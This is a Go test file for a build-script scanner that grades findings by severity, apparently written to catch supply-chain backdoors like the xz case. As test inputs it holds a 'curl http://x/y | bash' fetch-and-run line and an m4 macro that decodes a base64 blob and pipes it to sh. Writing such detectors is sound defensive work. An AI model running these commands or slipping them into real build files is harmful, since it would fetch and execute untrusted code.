package buildscript_test

import (
	"testing"

	"github.com/sarahmaeve/signatory/internal/signal/buildscript"
	"github.com/stretchr/testify/require"
)

func strongCount(fs []buildscript.Finding) int {
	n := 0
	for _, f := range fs {
		if f.Severity == buildscript.SeverityStrong {
			n++
		}
	}
	return n
}

func TestScan_CleanConfigureAcNeverStrong(t *testing.T) {
	// Ordinary autotools that merely shells out / runs a compiler is one
	// behaviour class at most and must never escalate to strong.
	content := []byte("AC_INIT([proj],[1.0])\nAC_PROG_CC\nAC_CONFIG_FILES([Makefile])\n")
	require.Zero(t, strongCount(buildscript.Scan("configure.ac", content)))
}

func TestScan_LoneDecodeIsInformational(t *testing.T) {
	// Decoding alone (no exec, no fetch) is informational — some legit
	// build scripts decode bundled data.
	content := []byte("import base64\nDATA = base64.b64decode(open('d','rb').read())\n")
	findings := buildscript.Scan("setup.py", content)
	require.NotEmpty(t, findings)
	for _, f := range findings {
		require.Equal(t, buildscript.SeverityInformational, f.Severity)
		require.Equal(t, buildscript.KindDecode, f.Kind)
	}
}

func TestScan_DecodePlusExecEscalatesToStrong(t *testing.T) {
	// The xz shape: a hand-written m4 macro that decodes a blob and
	// shell-execs it. Two behaviour classes in one file → strong.
	content := []byte("dnl helper\nm4_esyscmd([echo cGF5bG9hZA== | base64 -d | sh])\n")
	findings := buildscript.Scan("m4/build-to-host.m4", content)
	require.GreaterOrEqual(t, strongCount(findings), 1,
		"decode + exec co-occurrence must escalate to strong")

	// Findings carry line + snippet for analyst adjudication.
	for _, f := range findings {
		require.Equal(t, 2, f.Line)
		require.Contains(t, f.Snippet, "m4_esyscmd")
	}
}

func TestScan_FetchPlusExecEscalatesToStrong(t *testing.T) {
	// Build-time fetch piped into a shell is the remote-dropper shape.
	content := []byte("execute_process(COMMAND sh -c \"curl http://x/y | bash\")\n")
	require.GreaterOrEqual(t, strongCount(buildscript.Scan("build.rs", content)), 1)
}

func TestScan_HighEntropyLiteralIsStrong(t *testing.T) {
	blob := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	long := blob + blob + blob + blob // 256 chars, high entropy
	findings := buildscript.Scan("setup.py", []byte("PAYLOAD = '"+long+"'\n"))
	var got bool
	for _, f := range findings {
		if f.Kind == buildscript.KindHighEntropy {
			got = true
			require.Equal(t, buildscript.SeverityStrong, f.Severity)
		}
	}
	require.True(t, got, "a long high-entropy base64 literal must surface as a strong finding")
}

func TestScan_NoFindingsOnInertScript(t *testing.T) {
	require.Empty(t, buildscript.Scan("setup.py",
		[]byte("from setuptools import setup\nsetup(name='ok', version='1.0')\n")))
}
